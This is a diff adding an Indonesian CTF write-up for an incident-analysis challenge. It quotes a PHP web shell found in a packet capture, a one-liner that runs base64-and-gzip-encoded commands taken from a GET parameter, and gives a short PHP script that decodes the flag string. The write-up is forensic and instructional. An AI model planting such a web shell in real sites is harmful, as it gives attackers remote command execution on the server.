@@ -15,9 +15,25 @@ featured: false
 
 ### Problem :
 
-![Incident Analysis](/images/incident-analysis-machine.png)
-
+![Incident Analysis](/images/incident-analysis.png)
 
 ### Solusi :
 
+dalam pcapng yang diberikan kami menemukan potongan code php yang cukup menarik perhatian kami yaitu 
+`<?php system(gzuncompress(base64_decode(\$_GET['id']))); ?>`
+Ini gunanya untuk mengakses command ke system() dengan memberikan input base64 dengan request GET ke ?id= sehingga memungkinkan 
+attacker untuk melakukan **command injection**
 
+Kemudian kami mencoba melakukan beberapa decode sehingga menemukan flag di string ini
+`eJxLTc7IV3B39XUMDvH0ri4yNsmJzzMuiU9Myc3Mi09OzItPzEvMqaxKjU8sKUlMzo5PK8rPjU8pzS2oVbBT0C/JLdBPT81NLC7JzNYrqSgBAGIlHSE=`
+
+```php
+<?php
+    $string='eJxLTc7IV3B39XUMDvH0ri4yNsmJzzMuiU9Myc3Mi09OzItPzEvMqaxKjU8sKUlMzo5PK8rPjU8pzS2oVbBT0C/JLdBPT81NLC7JzNYrqSgBAGIlHSE=';
+    $a = base64_decode($string);
+    $b = gzuncompress($a);
+    echo $b;
+?>
+```
+
+![incident analysis flag](/images/incident-analysis-flag.png)
